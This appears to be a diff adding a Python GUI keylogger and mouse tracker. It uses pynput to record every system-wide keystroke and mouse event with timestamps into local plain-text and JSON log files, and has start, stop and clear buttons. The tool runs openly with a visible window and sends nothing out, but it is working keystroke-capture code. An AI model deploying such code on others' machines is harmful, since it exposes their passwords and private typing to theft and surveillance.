@@ -1,0 +1,152 @@
+import tkinter as tk
+from tkinter import messagebox
+from pynput import keyboard, mouse
+import json
+import threading
+import time
+import os
+
+# Create the main Tkinter window
+root = tk.Tk()
+root.geometry("450x400")
+root.title("Keylogger & Mouse Tracker")
+root.config(bg="#2C3E50")  # Dark blue-gray background
+
+# Global variables
+key_list = []
+mouse_list = []
+key_strokes = ""
+keylogger_active = True  # To control logging
+key_listener = None
+mouse_listener = None
+
+# Function to get timestamp
+def get_timestamp():
+    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+
+# Function to update log files
+def update_txt_file(key):
+    with open('logs.txt', 'w+') as key_stroke:
+        key_stroke.write(key)
+
+def update_json_file():
+    with open('logs.json', 'w') as key_log:
+        json.dump({"keys": key_list, "mouse": mouse_list}, key_log, indent=4)
+
+# Keyboard event handlers
+def on_press(key):
+    global keylogger_active, key_list
+    if not keylogger_active:
+        return  # Stop logging if deactivated
+
+    try:
+        key_char = key.char if hasattr(key, 'char') else str(key)
+    except AttributeError:
+        key_char = str(key)
+
+    key_list.append({'Pressed': key_char, 'Timestamp': get_timestamp()})
+    update_json_file()
+
+def on_release(key):
+    global keylogger_active, key_list, key_strokes
+    if not keylogger_active:
+        return
+
+    try:
+        key_char = key.char if hasattr(key, 'char') else str(key)
+    except AttributeError:
+        key_char = str(key)
+
+    key_list.append({'Released': key_char, 'Timestamp': get_timestamp()})
+    key_strokes += key_char + " "
+    update_txt_file(key_strokes)
+    update_json_file()
+
+# Mouse event handlers
+def on_move(x, y):
+    if not keylogger_active:
+        return
+
+    mouse_list.append({"Move": f"({x}, {y})", "Timestamp": get_timestamp()})
+    update_json_file()
+    mouse_label.config(text=f"🖱️ Mouse Position: ({x}, {y})")
+
+def on_click(x, y, button, pressed):
+    if not keylogger_active:
+        return
+
+    action = "Pressed" if pressed else "Released"
+    mouse_list.append({action: f"{button} at ({x}, {y})", "Timestamp": get_timestamp()})
+    update_json_file()
+
+def on_scroll(x, y, dx, dy):
+    if not keylogger_active:
+        return
+
+    direction = "Up" if dy > 0 else "Down"
+    mouse_list.append({"Scrolled": f"{direction} at ({x}, {y})", "Timestamp": get_timestamp()})
+    update_json_file()
+
+# Function to clear logs
+def clear_logs():
+    global key_list, mouse_list, key_strokes
+    key_list, mouse_list, key_strokes = [], [], ""
+
+    open('logs.txt', 'w').close()
+    open('logs.json', 'w').close()
+
+    update_json_file()
+    messagebox.showinfo("Logs Cleared", "All logs have been deleted successfully!")
+    print("[!] Logs Cleared!")
+
+# Function to start logging
+def start_logging():
+    global keylogger_active
+    keylogger_active = True
+    messagebox.showinfo("Logging Started", "Keylogging and Mouse Tracking have started.")
+
+# Function to stop logging **without closing window**
+def stop_logging():
+    global keylogger_active
+    keylogger_active = False
+    messagebox.showinfo("Logging Stopped", "Keylogging and Mouse Tracking have been stopped.")
+
+# Start keylogger and mouse tracker
+def start_listeners():
+    global key_listener, mouse_listener
+
+    key_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)
+
+    key_listener.start()
+    mouse_listener.start()
+
+# UI Elements with Styling
+title_label = tk.Label(root, text="🔹 Keylogger & Mouse Tracker 🔹", 
+                       font=("Arial", 16, "bold"), bg="#2C3E50", fg="white")
+title_label.pack(pady=10)
+
+mouse_label = tk.Label(root, text="🖱️ Mouse Position: (0, 0)", 
+                       font=("Arial", 12), bg="#2C3E50", fg="lightgray")
+mouse_label.pack(pady=10)
+
+btn_style = {"font": ("Arial", 12), "fg": "white", "bg": "#2980B9", 
+             "activebackground": "#1A5276", "bd": 2, "relief": "ridge"}
+
+start_btn = tk.Button(root, text="▶ Start Logging", command=start_logging, **btn_style)
+start_btn.pack(pady=10, ipadx=10)
+
+stop_btn = tk.Button(root, text="🛑 Stop Logging", command=stop_logging, **btn_style)
+stop_btn.pack(pady=10, ipadx=10)
+
+clear_btn = tk.Button(root, text="🧹 Clear Logs", command=clear_logs, **btn_style)
+clear_btn.pack(pady=10, ipadx=10)
+
+# Run keylogger in a separate thread
+threading.Thread(target=start_listeners, daemon=True).start()
+
+print("[+] Running Keylogger with Mouse Tracking...")
+print("[!] Saving key logs and mouse activity in 'logs.json' and 'logs.txt'")
+
+# Start Tkinter GUI
+root.mainloop()
